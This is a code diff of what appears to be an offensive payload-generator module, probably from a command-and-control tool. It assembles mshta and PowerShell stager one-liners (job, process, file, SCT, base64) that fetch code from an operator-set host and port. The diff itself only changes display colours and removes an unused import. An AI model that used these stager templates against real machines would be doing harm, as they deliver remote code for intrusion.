@@ -1,4 +1,4 @@
-from os import mkdir, system, popen
+from os import system, popen
 from rich.console import Console
 
 from core import config
@@ -7,7 +7,7 @@ from core.config import *
 console = Console()
 
 def hta_paylods():
-    config.PAYLOADS.append("\n[bold italic blue][-] HTA-Payloads[/ bold italic blue]")
+    config.PAYLOADS.append("\n[bold italic white][-] HTA-Payloads[/ bold italic white]")
     if SSL:
         """Appending payloads"""
         config.PAYLOADS.append(f'[bold red]->[/bold red] mshta https://{config.HOST}:{config.PORT}{config.hta_payload}')
@@ -34,9 +34,9 @@ def pwsh_job():
     PROCESS = commandP.replace('{payload}', payload.decode("UTF-8"))
 
     """Appending payloads"""
-    config.PAYLOADS.append("\n[bold italic blue][-] Powershell Job[/ bold italic blue]")
+    config.PAYLOADS.append("\n[bold italic white][-] Powershell Job[/ bold italic white]")
     config.PAYLOADS.append(f"[bold red]->[/bold red] {JOB}")
-    config.PAYLOADS.append("\n[bold italic blue][-] Powershell Process[/ bold italic blue]")
+    config.PAYLOADS.append("\n[bold italic white][-] Powershell Process[/ bold italic white]")
     config.PAYLOADS.append(f"[bold red]->[/bold red] {PROCESS}")
 
     console.log("[green][+] Created Powershell Start-Job & Start-Process [/green]")
@@ -53,7 +53,7 @@ def pwsh_file():
     FILE = commandF.replace('{payload}', payload.decode("UTF-8"))
 
     """Appending payloads"""
-    config.PAYLOADS.append("\n[bold italic blue][-] Powershell File[/ bold italic blue]")
+    config.PAYLOADS.append("\n[bold italic white][-] Powershell File[/ bold italic white]")
     config.PAYLOADS.append(f"[bold red]->[/bold red] {FILE}")
 
     console.log("[green][+] Created Powershell File[/green]")
@@ -70,7 +70,7 @@ def pwsh_sct():
     SCT = commandF.replace('{payload}', payload.decode("UTF-8"))
 
     """Appending payloads"""
-    config.PAYLOADS.append("\n[bold italic blue][-] Powershell SCT[/ bold italic blue]")
+    config.PAYLOADS.append("\n[bold italic white][-] Powershell SCT[/ bold italic white]")
     config.PAYLOADS.append(f"[bold red]->[/bold red] {SCT}")
 
     console.log("[green][+] Created Powershell SCT[/green]")
@@ -93,7 +93,7 @@ def simple_payloads():
         payload3 = payload3.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw}",raw_payload).replace("{HTTP}", "http")
 
     """Appending payloads"""
-    config.PAYLOADS.append("\n[bold italic blue][-] Powershell Misc[/ bold italic blue]")
+    config.PAYLOADS.append("\n[bold italic white][-] Powershell Misc[/ bold italic white]")
     config.PAYLOADS.append(f"[bold red]->[/bold red] {payload}")
     config.PAYLOADS.append(f"[bold red]->[/bold red] {payload2}")
     config.PAYLOADS.append(f"[bold red]->[/bold red] {payload3}")
@@ -115,7 +115,7 @@ def pwsh_base64():
         payload3 = payload3.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b64stager}", b64_stager).replace("{HTTP}", "http")
 
     """Appending payloads"""
-    config.PAYLOADS.append("\n[bold italic blue][-] Powershell Base64[/ bold italic blue]")
+    config.PAYLOADS.append("\n[bold italic white][-] Powershell Base64[/ bold italic white]")
     config.PAYLOADS.append(f"[bold red]->[/bold red] {payload}")
     config.PAYLOADS.append(f"[bold red]->[/bold red] {payload2}")
     config.PAYLOADS.append(f"[bold red]->[/bold red] {payload3}")
@@ -140,7 +140,7 @@ def pwsh_base52():
         payload4 = payload4.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b52payload}",b52_payload).replace("{HTTP}", "http")
 
     """Appending payloads"""
-    config.PAYLOADS.append("\n[bold italic blue][-] Powershell Base54[/ bold italic blue]")
+    config.PAYLOADS.append("\n[bold italic white][-] Powershell Base54[/ bold italic white]")
     config.PAYLOADS.append(f"[bold red]->[/bold red] {payload}")
     config.PAYLOADS.append(f"[bold red]->[/bold red] {payload2}")
     config.PAYLOADS.append(f"[bold red]->[/bold red] {payload3}")
